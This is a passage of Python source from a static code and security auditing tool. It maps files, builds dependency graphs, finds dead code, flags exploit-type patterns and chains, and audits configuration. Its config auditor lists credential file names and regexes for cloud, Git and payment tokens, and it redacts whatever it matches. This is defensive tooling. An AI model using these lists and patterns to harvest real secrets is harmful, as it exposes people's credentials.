                                f"ATTACK VECTOR: {pattern_def['attack_vector']}\n"
                                f"IMPACT: {pattern_def['impact']}\n"
                                f"EXPLOITABILITY: {pattern_def['exploitability']}"
                            ),
                            "recommendation": pattern_def["recommendation"],
                        }
                        finding = Finding(rel_path, i, line, rule, ctx_before, ctx_after)
                        finding.exploit_type = pattern_def.get("exploit_type", "Unknown")
                        finding.attack_vector = pattern_def.get("attack_vector", "")
                        finding.impact = pattern_def.get("impact", "")
                        finding.exploitability = pattern_def.get("exploitability", "")
                        self.findings.append(finding)
            except re.error:
                continue

    def _build_exploit_chains(self):
        by_file = defaultdict(list)
        for f in self.findings:
            by_file[f.file_path].append(f)

        for file_path, file_findings in by_file.items():
            for i, f1 in enumerate(file_findings):
                for f2 in file_findings[i+1:]:
                    chain_pairs = [
                        ("Integer Overflow", "Heap Buffer Overflow"),
                        ("Integer Overflow", "Stack Buffer Overflow"),
                        ("Information Disclosure", "Stack Buffer Overflow"),
                        ("Information Disclosure", "Heap Buffer Overflow"),
                        ("Information Disclosure", "Use-After-Free"),
                        ("Format String Attack", "Stack Buffer Overflow"),
                        ("Use-After-Free", "Type Confusion"),
                        ("TOCTOU Race Condition", "Privilege Escalation"),
                        ("SQL Injection", "Remote Code Execution"),
                        ("Path Traversal", "Remote Code Execution"),
                        ("SSRF", "Remote Code Execution"),
                        ("Prototype Pollution", "Remote Code Execution"),
                        ("Missing Access Control", "Reentrancy Attack"),
                    ]
                    t1 = getattr(f1, "exploit_type", "")
                    t2 = getattr(f2, "exploit_type", "")
                    for a, b in chain_pairs:
                        if (a in t1 and b in t2) or (b in t1 and a in t2):
                            chain = {
                                "step1": {"id": f1.rule["id"], "type": t1, "file": f1.file_path, "line": f1.line_num},
                                "step2": {"id": f2.rule["id"], "type": t2, "file": f2.file_path, "line": f2.line_num},
                                "chain_description": f"{t1} at line {f1.line_num} feeds into {t2} at line {f2.line_num}",
                                "severity": SEVERITY_CRITICAL,
                            }
                            self.exploit_chains.append(chain)
                            f1.connections.append(f2)
                            f2.connections.append(f1)
                            f1.connection_reason = f"Exploit chain: {t1} → {t2}"
                            f2.connection_reason = f"Exploit chain: {t2} ← {t1}"

    def scan(self):
        print("\n  [EXPLOIT] Scanning for exploitable vulnerabilities...", end="", flush=True)
        file_count = 0
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in self.skip_dirs]
            for fname in sorted(files):
                fpath = Path(root) / fname
                lang = self.detect_language(fpath)
                if not lang:
                    continue
                self.scan_file_for_exploits(fpath, lang)
                file_count += 1
                if file_count % 100 == 0:
                    print(".", end="", flush=True)

        self._build_exploit_chains()
        print(f" found {len(self.findings)} potential exploits, {len(self.exploit_chains)} exploit chains")
        return self.findings


class FileSystemMapper:
    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.tree = {}
        self.all_files = []
        self.all_dirs = []
        self.hidden_files = []
        self.symlinks = []
        self.empty_files = []
        self.empty_dirs = []
        self.largest_files = []
        self.newest_files = []
        self.oldest_files = []
        self.file_types = defaultdict(int)
        self.total_size = 0
        self.max_depth = 0
        self.orphan_files = []
        self.duplicate_files = defaultdict(list)
        self.binary_files = []

    def scan(self):
        print("  [FSMAP] Deep file system mapping...", end="", flush=True)
        for root, dirs, files in os.walk(self.target_path, followlinks=False):
            depth = str(root).replace(str(self.target_path), "").count(os.sep)
            self.max_depth = max(self.max_depth, depth)
            rel_root = os.path.relpath(root, self.target_path)
            self.all_dirs.append(rel_root)

            if not files and not dirs:
                self.empty_dirs.append(rel_root)

            for fname in files:
                fpath = Path(root) / fname
                rel = os.path.relpath(fpath, self.target_path)

                try:
                    fstat = fpath.lstat()
                except (OSError, PermissionError):
                    continue

                finfo = {
                    "path": rel,
                    "size": fstat.st_size,
                    "modified": fstat.st_mtime,
                    "ext": fpath.suffix.lower(),
                    "is_symlink": fpath.is_symlink(),
                }
                self.all_files.append(finfo)
                self.total_size += fstat.st_size
                self.file_types[fpath.suffix.lower() if fpath.suffix else "(no ext)"] += 1

                if fname.startswith("."):
                    self.hidden_files.append(finfo)
                if fpath.is_symlink():
                    try:
                        target = os.readlink(fpath)
                        self.symlinks.append({"path": rel, "target": target, "valid": Path(target).exists() if os.path.isabs(target) else (fpath.parent / target).exists()})
                    except OSError:
                        self.symlinks.append({"path": rel, "target": "?", "valid": False})
                if fstat.st_size == 0:
                    self.empty_files.append(rel)

                if fstat.st_size > 0 and fstat.st_size < 500_000:
                    try:
                        with open(fpath, "rb") as bf:
                            chunk = bf.read(512)
                            if b"\x00" in chunk:
                                self.binary_files.append(rel)
                    except (OSError, PermissionError):
                        pass

                if fstat.st_size > 0 and fstat.st_size < 2_000_000:
                    try:
                        h = hashlib.md5()
                        with open(fpath, "rb") as hf:
                            for block in iter(lambda: hf.read(8192), b""):
                                h.update(block)
                        self.duplicate_files[h.hexdigest()].append(rel)
                    except (OSError, PermissionError):
                        pass

        self.largest_files = sorted(self.all_files, key=lambda x: -x["size"])[:25]
        self.newest_files = sorted(self.all_files, key=lambda x: -x["modified"])[:25]
        self.oldest_files = sorted([f for f in self.all_files if f["modified"] > 0], key=lambda x: x["modified"])[:25]
        self.duplicate_files = {h: paths for h, paths in self.duplicate_files.items() if len(paths) > 1}

        print(f" done ({len(self.all_files)} files, {len(self.all_dirs)} dirs, depth={self.max_depth})")

    def to_dict(self):
        return {
            "total_files": len(self.all_files),
            "total_dirs": len(self.all_dirs),
            "total_size_bytes": self.total_size,
            "total_size_human": self._human_size(self.total_size),
            "max_depth": self.max_depth,
            "hidden_files": len(self.hidden_files),
            "hidden_file_list": [f["path"] for f in self.hidden_files[:50]],
            "symlinks": self.symlinks[:50],
            "empty_files": self.empty_files[:50],
            "empty_dirs": self.empty_dirs[:50],
            "binary_files": self.binary_files[:50],
            "largest_files": [{"path": f["path"], "size": self._human_size(f["size"])} for f in self.largest_files],
            "file_type_distribution": dict(sorted(self.file_types.items(), key=lambda x: -x[1])[:40]),
            "duplicate_file_groups": len(self.duplicate_files),
            "duplicate_files": {h: paths for h, paths in list(self.duplicate_files.items())[:30]},
        }

    def _human_size(self, b):
        for u in ["B", "KB", "MB", "GB", "TB"]:
            if b < 1024:
                return f"{b:.1f} {u}"
            b /= 1024
        return f"{b:.1f} PB"


class DependencyGraphSpider:
    IMPORT_RE = {
        "python": [re.compile(r"^\s*(?:from\s+(\S+)\s+)?import\s+(\S+)", re.MULTILINE)],
        "javascript": [re.compile(r"""(?:import\s+.*?from\s+['"]([^'"]+)['"]|require\s*\(\s*['"]([^'"]+)['"]\s*\))""")],
        "typescript": [re.compile(r"""(?:import\s+.*?from\s+['"]([^'"]+)['"]|require\s*\(\s*['"]([^'"]+)['"]\s*\))""")],
        "cpp": [re.compile(r'#\s*include\s*[<"]([^>"]+)[>"]')],
        "java": [re.compile(r"^\s*import\s+([\w.]+)", re.MULTILINE)],
        "go": [re.compile(r'"([^"]+)"')],
        "rust": [re.compile(r"(?:use\s+|extern\s+crate\s+)([\w:]+)")],
        "ruby": [re.compile(r"""require(?:_relative)?\s*[('"]([^'"]+)['")]""")],
        "php": [re.compile(r"""(?:include|require|include_once|require_once)\s*[('"]([^'"]+)['")]""")],
        "csharp": [re.compile(r"using\s+([\w.]+)")],
        "solidity": [re.compile(r"""import\s+['"]([^'"]+)['"]""")],
        "swift": [re.compile(r"import\s+(\w+)")],
        "kotlin": [re.compile(r"import\s+([\w.]+)")],
        "dart": [re.compile(r"""import\s+['"]([^'"]+)['"]""")],
        "elixir": [re.compile(r"(?:import|alias|use|require)\s+([\w.]+)")],
        "scala": [re.compile(r"import\s+([\w.]+)")],
        "perl": [re.compile(r"use\s+([\w:]+)")],
        "r": [re.compile(r"""(?:library|require)\s*\(\s*['"]?(\w+)['"]?\s*\)""")],
        "lua": [re.compile(r"""require\s*[('"]([^'"]+)['")]""")],
    }
    SKIP_DIRS = {".git", "node_modules", "__pycache__", "venv", "env", ".tox",
                 "build", "dist", "target", ".idea", ".vscode", "vendor",
                 "third_party", "external", "deps", ".cache", ".next"}

    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.graph = defaultdict(set)
        self.reverse_graph = defaultdict(set)
        self.all_source_files = set()
        self.isolated_files = []
        self.circular_deps = []
        self.dead_modules = []
        self.most_imported = []
        self.most_dependent = []
        self.entry_points = []

    def scan(self):
        print("  [DEPWEB] Building full dependency graph...", end="", flush=True)
        file_map = {}
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in self.SKIP_DIRS]
            for fname in files:
                fpath = Path(root) / fname
                ext = fpath.suffix.lower()
                lang = None
                for l, exts in LANG_EXTENSIONS.items():
                    if ext in exts:
                        lang = l
                        break
                if not lang:
                    continue
                rel = os.path.relpath(fpath, self.target_path)
                self.all_source_files.add(rel)
                file_map[rel] = (fpath, lang)

        for rel, (fpath, lang) in file_map.items():
            try:
                with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                    content = f.read()
            except (OSError, PermissionError):
                continue

            patterns = self.IMPORT_RE.get(lang, [])
            for pat in patterns:
                for match in pat.finditer(content):
                    groups = [g for g in match.groups() if g]
                    for imp in groups:
                        self.graph[rel].add(imp)
                        self.reverse_graph[imp].add(rel)

        self._find_circular_deps()
        self._find_isolated()
        self._find_dead_modules()
        self._compute_rankings()

        print(f" done ({len(self.all_source_files)} files, {len(self.circular_deps)} circular deps, {len(self.isolated_files)} isolated)")

    def _find_circular_deps(self):
        visited = set()
        path = []
        path_set = set()
        found = set()

        def dfs(node):
            if node in path_set:
                cycle_start = path.index(node)
                cycle = tuple(sorted(path[cycle_start:]))
                if cycle not in found:
                    found.add(cycle)
                    self.circular_deps.append(list(path[cycle_start:]) + [node])
                return
            if node in visited:
                return
            visited.add(node)
            path.append(node)
            path_set.add(node)
            for dep in self.graph.get(node, set()):
                for src in self.all_source_files:
                    if dep in src or src.endswith(dep.replace(".", "/") + ".py") or src.endswith(dep.replace(".", "/") + ".ts") or src.endswith(dep.replace(".", "/") + ".js"):
                        dfs(src)
                        break
            path.pop()
            path_set.discard(node)

        for node in list(self.all_source_files)[:500]:
            dfs(node)

    def _find_isolated(self):
        referenced = set()
        for targets in self.graph.values():
            for t in targets:
                for src in self.all_source_files:
                    if t in src:
                        referenced.add(src)
        for src in self.all_source_files:
            if src not in referenced and not self.graph.get(src):
                self.isolated_files.append(src)

    def _find_dead_modules(self):
        referenced_as_target = set()
        for targets in self.graph.values():
            for t in targets:
                for src in self.all_source_files:
                    if t in src:
                        referenced_as_target.add(src)
        for src in self.all_source_files:
            if src not in referenced_as_target and src not in self.isolated_files:
                base = Path(src).stem.lower()
                if base not in ("main", "index", "app", "server", "setup", "manage", "__init__", "cli", "mod"):
                    self.dead_modules.append(src)

    def _compute_rankings(self):
        import_count = defaultdict(int)
        for targets in self.graph.values():
            for t in targets:
                import_count[t] += 1
        self.most_imported = sorted(import_count.items(), key=lambda x: -x[1])[:20]
        dep_count = {src: len(deps) for src, deps in self.graph.items()}
        self.most_dependent = sorted(dep_count.items(), key=lambda x: -x[1])[:20]
        self.entry_points = [src for src in self.all_source_files if src not in {s for targets in self.reverse_graph.values() for s in targets}]

    def to_dict(self):
        return {
            "total_source_files": len(self.all_source_files),
            "total_import_links": sum(len(v) for v in self.graph.values()),
            "circular_dependencies": self.circular_deps[:20],
            "isolated_files": sorted(self.isolated_files)[:50],
            "dead_modules": sorted(self.dead_modules)[:50],
            "most_imported": self.most_imported,
            "most_dependent": self.most_dependent,
            "entry_points": sorted(self.entry_points)[:30],
            "full_graph": {k: sorted(v) for k, v in sorted(self.graph.items())},
        }


class DeadCodeDetector:
    FUNC_PATTERNS = {
        "python": re.compile(r"^\s*(?:async\s+)?def\s+(\w+)\s*\(", re.MULTILINE),
        "javascript": re.compile(r"(?:function\s+(\w+)|(?:const|let|var)\s+(\w+)\s*=\s*(?:async\s+)?(?:function|\([^)]*\)\s*=>|\w+\s*=>))", re.MULTILINE),
        "typescript": re.compile(r"(?:function\s+(\w+)|(?:const|let|var|export\s+(?:const|let|var|function))\s+(\w+)\s*(?:=\s*(?:async\s+)?(?:function|\([^)]*\)\s*=>)|\s*\())", re.MULTILINE),
        "cpp": re.compile(r"(?:(?:static|inline|virtual|void|int|char|bool|auto|string|float|double|long|unsigned|signed|const)\s+)+(\w+)\s*\([^)]*\)\s*\{", re.MULTILINE),
        "java": re.compile(r"(?:public|private|protected|static|final|abstract|synchronized|native)\s+.*?(\w+)\s*\([^)]*\)\s*\{", re.MULTILINE),
        "go": re.compile(r"^func\s+(?:\([^)]+\)\s+)?(\w+)\s*\(", re.MULTILINE),
        "rust": re.compile(r"(?:pub\s+)?fn\s+(\w+)\s*(?:<[^>]*>)?\s*\(", re.MULTILINE),
        "ruby": re.compile(r"^\s*def\s+(\w+)", re.MULTILINE),
        "php": re.compile(r"(?:public|private|protected|static)?\s*function\s+(\w+)\s*\(", re.MULTILINE),
        "csharp": re.compile(r"(?:public|private|protected|internal|static|virtual|override|abstract|async)\s+.*?(\w+)\s*\([^)]*\)\s*\{", re.MULTILINE),
        "solidity": re.compile(r"function\s+(\w+)\s*\(", re.MULTILINE),
        "swift": re.compile(r"func\s+(\w+)\s*(?:<[^>]*>)?\s*\(", re.MULTILINE),
        "kotlin": re.compile(r"fun\s+(\w+)\s*(?:<[^>]*>)?\s*\(", re.MULTILINE),
    }
    VAR_PATTERNS = {
        "python": re.compile(r"^(\w+)\s*=\s*(?!.*(?:def|class|import))", re.MULTILINE),
        "javascript": re.compile(r"(?:const|let|var)\s+(\w+)\s*=", re.MULTILINE),
        "typescript": re.compile(r"(?:const|let|var)\s+(\w+)\s*(?::\s*\w+)?\s*=", re.MULTILINE),
    }
    UNREACHABLE_PATTERNS = [
        re.compile(r"^\s*(?:return|throw|sys\.exit|process\.exit|os\._exit|exit)\b[^;]*$(?:\n\s+\S+)", re.MULTILINE),
    ]
    SKIP_DIRS = {".git", "node_modules", "__pycache__", "venv", "env", ".tox",
                 "build", "dist", "target", ".idea", ".vscode", "vendor",
                 "third_party", "external", "deps", ".cache", ".next"}
    BUILTINS = {"__init__", "__str__", "__repr__", "__eq__", "__hash__", "__len__",
                "__getitem__", "__setitem__", "__delitem__", "__iter__", "__next__",
                "__enter__", "__exit__", "__call__", "__new__", "__del__",
                "main", "setup", "teardown", "setUp", "tearDown", "test_",
                "get", "post", "put", "delete", "patch", "head", "options",
                "render", "componentDidMount", "componentWillUnmount", "useEffect",
                "constructor", "toString", "valueOf", "toJSON", "clone",
                "run", "execute", "start", "stop", "init", "configure"}

    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.defined_functions = {}
        self.used_identifiers = defaultdict(int)
        self.dead_functions = []
        self.dead_variables = []
        self.unreachable_code = []
        self.empty_functions = []
        self.commented_code_blocks = []
        self.todo_fixme = []
        self.empty_catch_blocks = []
        self.unused_imports = []

    def scan(self):
        print("  [DEAD] Scanning for dead code, unreachable paths, unused identifiers...", end="", flush=True)
        all_contents = {}
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in self.SKIP_DIRS]
            for fname in files:
                fpath = Path(root) / fname
                ext = fpath.suffix.lower()
                lang = None
                for l, exts in LANG_EXTENSIONS.items():
                    if ext in exts:
                        lang = l
                        break
                if not lang:
                    continue
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except (OSError, PermissionError):
                    continue
                rel = os.path.relpath(fpath, self.target_path)
                all_contents[rel] = (content, lang)
                self._extract_definitions(rel, content, lang)
                self._find_unreachable(rel, content, lang)
                self._find_empty_functions(rel, content, lang)
                self._find_commented_code(rel, content)
                self._find_todos(rel, content)
                self._find_empty_catches(rel, content, lang)

        full_corpus = "\n".join(c for c, _ in all_contents.values())
        for ident in set(list(self.defined_functions.keys())):
            count = full_corpus.count(ident)
            if count <= 1 and ident not in self.BUILTINS and not ident.startswith("_"):
                info = self.defined_functions[ident]
                self.dead_functions.append(info)

        print(f" done ({len(self.dead_functions)} dead funcs, {len(self.unreachable_code)} unreachable, {len(self.todo_fixme)} TODOs)")

    def _extract_definitions(self, rel_path, content, lang):
        func_pat = self.FUNC_PATTERNS.get(lang)
        if func_pat:
            for m in func_pat.finditer(content):
                name = next((g for g in m.groups() if g), None)
                if name and len(name) > 1:
                    line_num = content[:m.start()].count("\n") + 1
                    self.defined_functions[name] = {"name": name, "file": rel_path, "line": line_num, "lang": lang}

    def _find_unreachable(self, rel_path, content, lang):
        lines = content.split("\n")
        for i, line in enumerate(lines):
            stripped = line.strip()
            if re.match(r"^(?:return|throw|sys\.exit|process\.exit|os\._exit|exit|break|continue)\b", stripped):
                if i + 1 < len(lines):
                    next_line = lines[i + 1].strip()
                    if next_line and not next_line.startswith(("#", "//", "/*", "*", "}", ")", "]", "else", "except", "catch", "finally", "case", "default")):
                        indent_curr = len(line) - len(line.lstrip())
                        indent_next = len(lines[i + 1]) - len(lines[i + 1].lstrip())
                        if indent_next >= indent_curr and indent_next > 0:
                            self.unreachable_code.append({"file": rel_path, "line": i + 2, "code": next_line[:120], "after": stripped[:60]})

    def _find_empty_functions(self, rel_path, content, lang):
        if lang == "python":
            for m in re.finditer(r"def\s+(\w+)\s*\([^)]*\)\s*:\s*\n(\s+)(pass|\.\.\.)\s*$", content, re.MULTILINE):
                line_num = content[:m.start()].count("\n") + 1
                self.empty_functions.append({"name": m.group(1), "file": rel_path, "line": line_num})
        elif lang in ("javascript", "typescript", "java", "cpp", "csharp", "go", "rust"):
            for m in re.finditer(r"(?:function\s+(\w+)|(\w+)\s*=\s*(?:async\s+)?function)\s*\([^)]*\)\s*\{\s*\}", content):
                name = m.group(1) or m.group(2) or "?"
                line_num = content[:m.start()].count("\n") + 1
                self.empty_functions.append({"name": name, "file": rel_path, "line": line_num})

    def _find_commented_code(self, rel_path, content):
        lines = content.split("\n")
        block_start = None
        block_count = 0
        for i, line in enumerate(lines):
            stripped = line.strip()
            is_commented = stripped.startswith("//") or stripped.startswith("#")
            if is_commented and any(kw in stripped for kw in ("function", "def ", "class ", "var ", "let ", "const ", "if ", "for ", "while ", "return ", "import ", "=", "(", "{")):
                if block_start is None:
                    block_start = i + 1
                    block_count = 1
                else:
                    block_count += 1
            else:
                if block_count >= 5:
                    self.commented_code_blocks.append({"file": rel_path, "start_line": block_start, "lines": block_count})
                block_start = None
                block_count = 0

    def _find_todos(self, rel_path, content):
        for m in re.finditer(r"(?://|#|/\*|\*)\s*(TODO|FIXME|HACK|BUG|XXX|OPTIMIZE|DEPRECATED|TEMP|TEMPORARY)\b[:\s]*(.*)", content, re.IGNORECASE):
            line_num = content[:m.start()].count("\n") + 1
            self.todo_fixme.append({"file": rel_path, "line": line_num, "type": m.group(1).upper(), "text": m.group(2).strip()[:200]})

    def _find_empty_catches(self, rel_path, content, lang):
        if lang in ("javascript", "typescript", "java", "cpp", "csharp", "kotlin"):
            for m in re.finditer(r"catch\s*\([^)]*\)\s*\{\s*\}", content):
                line_num = content[:m.start()].count("\n") + 1
                self.empty_catch_blocks.append({"file": rel_path, "line": line_num})
        elif lang == "python":
            for m in re.finditer(r"except[^:]*:\s*\n\s+pass\s*$", content, re.MULTILINE):
                line_num = content[:m.start()].count("\n") + 1
                self.empty_catch_blocks.append({"file": rel_path, "line": line_num})

    def to_dict(self):
        return {
            "dead_functions": self.dead_functions[:100],
            "dead_function_count": len(self.dead_functions),
            "unreachable_code": self.unreachable_code[:100],
            "unreachable_count": len(self.unreachable_code),
            "empty_functions": self.empty_functions[:50],
            "commented_code_blocks": self.commented_code_blocks[:50],
            "todo_fixme": self.todo_fixme[:100],
            "todo_count": len(self.todo_fixme),
            "empty_catch_blocks": self.empty_catch_blocks[:50],
        }


class ConfigAuditor:
    SENSITIVE_FILENAMES = {
        ".env", ".env.local", ".env.production", ".env.development", ".env.staging",
        ".env.test", ".env.backup", ".env.bak", ".env.old", ".env.save",
        "credentials.json", "credentials.yaml", "credentials.yml",
        "secrets.json", "secrets.yaml", "secrets.yml", "secrets.toml",
        ".htpasswd", ".htaccess", "shadow", "passwd",
        "wp-config.php", "config.php", "database.yml", "database.json",
        "settings.py", "local_settings.py",
        "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519",
        "server.key", "server.pem", "private.key", "private.pem",
        ".pgpass", ".my.cnf", ".npmrc", ".pypirc", ".netrc", ".docker/config.json",
        "terraform.tfvars", "terraform.tfstate",
        "kubeconfig", "kube/config",
        "firebase.json", "firebaserc", "service-account.json",
    }
    SECRET_PATTERNS = [
        ("AWS Access Key", re.compile(r"(A3T[A-Z0-9]|AKIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA|ASIA)[A-Z0-9]{16}")),
        ("AWS Secret Key", re.compile(r"(?i)aws[_\-.]?secret[_\-.]?access[_\-.]?key\s*[=:]\s*['\"]?([A-Za-z0-9/+=]{40})")),
        ("GitHub Token", re.compile(r"gh[pso]_[A-Za-z0-9]{36}")),
        ("GitLab Token", re.compile(r"glpat-[A-Za-z0-9\-]{20}")),
        ("Slack Token", re.compile(r"xox[baprs]-[A-Za-z0-9\-]+")),
        ("Stripe Key", re.compile(r"(?:sk|pk)_(?:test|live)_[A-Za-z0-9]{20,}")),
        ("Twilio Key", re.compile(r"SK[a-f0-9]{32}")),
        ("SendGrid Key", re.compile(r"SG\.[A-Za-z0-9_\-]{22}\.[A-Za-z0-9_\-]{43}")),
        ("Mailgun Key", re.compile(r"key-[a-f0-9]{32}")),
        ("Google API Key", re.compile(r"AIza[0-9A-Za-z\-_]{35}")),
        ("Heroku API Key", re.compile(r"(?i)heroku[_\-.]?api[_\-.]?key\s*[=:]\s*['\"]?([a-f0-9\-]{36,})")),
        ("Private Key Block", re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY")),
        ("JWT Token", re.compile(r"eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}")),
        ("Generic Password", re.compile(r"""(?i)(?:password|passwd|pwd|secret|token|apikey|api_key|access_key)\s*[=:]\s*['"][^'"]{8,}['"]""")),
        ("Base64 Encoded Secret", re.compile(r"(?i)(?:password|secret|key|token)\s*[=:]\s*['\"]?(?:[A-Za-z0-9+/]{40,}={0,2})['\"]?")),
        ("Azure Storage Key", re.compile(r"(?i)AccountKey=[A-Za-z0-9+/]{88}==")),
        ("Database URL", re.compile(r"(?:postgres|mysql|mongodb|redis|amqp)://[^\s'\"]{10,}")),
        ("Discord Bot Token", re.compile(r"[MN][A-Za-z\d]{23,}\.[\w-]{6}\.[\w-]{27}")),
        ("Telegram Bot Token", re.compile(r"\d{8,10}:[A-Za-z0-9_-]{35}")),
        ("NPM Token", re.compile(r"npm_[A-Za-z0-9]{36}")),
        ("PyPI Token", re.compile(r"pypi-[A-Za-z0-9_-]{50,}")),
        ("Docker Hub Token", re.compile(r"dckr_pat_[A-Za-z0-9_-]{28,}")),
    ]
    BACKUP_EXTENSIONS = {".bak", ".backup", ".old", ".save", ".orig", ".tmp",
                         ".swp", ".swo", ".swn", ".~", ".copy"}
    LOG_EXTENSIONS = {".log", ".out", ".err"}
    SKIP_DIRS = {".git", "node_modules", "__pycache__", "venv", "env",
                 "build", "dist", "target", ".idea", ".vscode", "vendor"}

    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.sensitive_files = []
        self.exposed_secrets = []
        self.world_writable = []
        self.stale_logs = []
        self.backup_files = []
        self.high_entropy_strings = []
        self.permission_issues = []
        self.config_issues = []

    def scan(self):
        print("  [CONFIG] Auditing configuration, secrets, permissions...", end="", flush=True)
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in self.SKIP_DIRS]
            for fname in files:
                fpath = Path(root) / fname
                rel = os.path.relpath(fpath, self.target_path)

                if fname.lower() in self.SENSITIVE_FILENAMES or fname in self.SENSITIVE_FILENAMES:
                    self.sensitive_files.append(rel)

                ext = fpath.suffix.lower()
                if ext in self.BACKUP_EXTENSIONS or fname.endswith("~"):
                    self.backup_files.append(rel)

                if ext in self.LOG_EXTENSIONS:
                    try:
                        fsize = fpath.stat().st_size
                        mtime = fpath.stat().st_mtime
                        age_days = (time.time() - mtime) / 86400
                        self.stale_logs.append({"path": rel, "size": fsize, "age_days": round(age_days, 1)})
                    except (OSError, PermissionError):
                        pass

                try:
                    mode = fpath.stat().st_mode
                    if mode & stat_module.S_IWOTH:
                        self.world_writable.append(rel)
                    if fname.endswith((".key", ".pem", ".p12", ".pfx")) and (mode & stat_module.S_IROTH):
                        self.permission_issues.append({"file": rel, "issue": "Private key file is world-readable", "mode": oct(mode)})
                except (OSError, PermissionError):
                    pass

                if ext in (".py", ".js", ".ts", ".tsx", ".jsx", ".java", ".go", ".rb", ".php",
                           ".rs", ".cs", ".c", ".cpp", ".h", ".hpp", ".sol", ".env", ".yaml",
                           ".yml", ".json", ".toml", ".cfg", ".ini", ".conf", ".config",
                           ".properties", ".xml", ".sh", ".bash", ".zsh"):
                    try:
                        if fpath.stat().st_size > 5_000_000:
                            continue
                        with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                            content = f.read()
                    except (OSError, PermissionError):
                        continue

                    for secret_name, pattern in self.SECRET_PATTERNS:
                        for m in pattern.finditer(content):
                            line_num = content[:m.start()].count("\n") + 1
                            matched = m.group(0)
                            redacted = matched[:6] + "****" + matched[-4:] if len(matched) > 14 else "****"
                            self.exposed_secrets.append({
                                "file": rel, "line": line_num, "type": secret_name,
                                "preview": redacted,
                            })

                    self._check_entropy(rel, content)

                    if fname.lower() in (".env", ".env.local", ".env.production"):
                        self._check_env_config(rel, content)

        print(f" done ({len(self.sensitive_files)} sensitive files, {len(self.exposed_secrets)} secrets, {len(self.world_writable)} writable)")

    def _check_entropy(self, rel_path, content):
        lines = content.split("\n")
        for i, line in enumerate(lines, 1):
            for m in re.finditer(r"""(?:password|secret|key|token|api_key|apikey|access_key|private_key)\s*[=:]\s*['"]?([A-Za-z0-9+/=_\-]{20,})['"]?""", line, re.IGNORECASE):
                val = m.group(1)
                entropy = self._shannon_entropy(val)
                if entropy > 4.5:
                    self.high_entropy_strings.append({
                        "file": rel_path, "line": i,
                        "entropy": round(entropy, 2),
                        "preview": val[:8] + "****",
                    })

    def _shannon_entropy(self, data):
        if not data:
            return 0
        freq = defaultdict(int)
        for c in data:
            freq[c] += 1
        length = len(data)
        return -sum((count / length) * math.log2(count / length) for count in freq.values())

    def _check_env_config(self, rel_path, content):
        lines = content.split("\n")
        for i, line in enumerate(lines, 1):
            stripped = line.strip()
            if "=" in stripped and not stripped.startswith("#"):
                key, _, val = stripped.partition("=")
                val = val.strip().strip("'\"")
                if not val:
                    self.config_issues.append({"file": rel_path, "line": i, "issue": f"Empty value for {key.strip()}"})
                if val.lower() in ("true", "1", "yes") and "debug" in key.lower():
                    self.config_issues.append({"file": rel_path, "line": i, "issue": f"Debug mode enabled: {key.strip()}={val}"})

    def to_dict(self):
        return {
            "sensitive_files": self.sensitive_files[:50],
            "sensitive_file_count": len(self.sensitive_files),
            "exposed_secrets": self.exposed_secrets[:100],
            "exposed_secret_count": len(self.exposed_secrets),
            "high_entropy_strings": self.high_entropy_strings[:50],
            "world_writable_files": self.world_writable[:50],
            "permission_issues": self.permission_issues[:50],
            "stale_logs": sorted(self.stale_logs, key=lambda x: -x.get("age_days", 0))[:30],
            "backup_files": self.backup_files[:50],
            "backup_file_count": len(self.backup_files),
            "config_issues": self.config_issues[:50],
        }


class CodeQualityAnalyzer:
    SKIP_DIRS = {".git", "node_modules", "__pycache__", "venv", "env",
                 "build", "dist", "target", ".idea", ".vscode", "vendor",
                 "third_party", "external", "deps", ".cache", ".next"}

    def __init__(self, target_path):
        self.target_path = Path(target_path).resolve()
        self.complexity_scores = []
        self.long_files = []
        self.deeply_nested = []
        self.long_lines = []
        self.inconsistent_naming = []
        self.magic_numbers = []
        self.god_files = []
        self.large_functions = []
        self.overall_score = 0
        self.total_complexity = 0
        self.files_analyzed = 0

    def scan(self):
        print("  [QUALITY] Analyzing code quality, complexity, anti-patterns...", end="", flush=True)
        for root, dirs, files in os.walk(self.target_path):
            dirs[:] = [d for d in dirs if d not in self.SKIP_DIRS]
            for fname in files:
                fpath = Path(root) / fname
                ext = fpath.suffix.lower()
                lang = None
                for l, exts in LANG_EXTENSIONS.items():
                    if ext in exts:
                        lang = l
                        break
                if not lang:
                    continue
                try:
                    with open(fpath, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except (OSError, PermissionError):
                    continue

                rel = os.path.relpath(fpath, self.target_path)
                lines = content.split("\n")
                self.files_analyzed += 1
                self._measure_complexity(rel, content, lines, lang)
                self._check_line_lengths(rel, lines)
                self._find_deep_nesting(rel, lines, lang)
                self._find_magic_numbers(rel, lines, lang)
                self._check_god_file(rel, content, lines, lang)

        if self.files_analyzed > 0:
            avg_complexity = self.total_complexity / self.files_analyzed
            self.overall_score = max(0, min(100, 100 - (avg_complexity * 2) - len(self.god_files) * 5 - len(self.deeply_nested)))

        print(f" done ({self.files_analyzed} files, score={self.overall_score:.0f}/100)")

    def _measure_complexity(self, rel_path, content, lines, lang):
        cc = 1
        branch_keywords = {
            "python": (r"\b(if|elif|for|while|except|and|or)\b",),
            "javascript": (r"\b(if|else\s+if|for|while|switch|case|catch|&&|\|\||\?)\b",),
            "typescript": (r"\b(if|else\s+if|for|while|switch|case|catch|&&|\|\||\?)\b",),
            "cpp": (r"\b(if|else\s+if|for|while|switch|case|catch|&&|\|\||\?)\b",),
            "java": (r"\b(if|else\s+if|for|while|switch|case|catch|&&|\|\||\?)\b",),
            "go": (r"\b(if|for|switch|case|select|&&|\|\|)\b",),
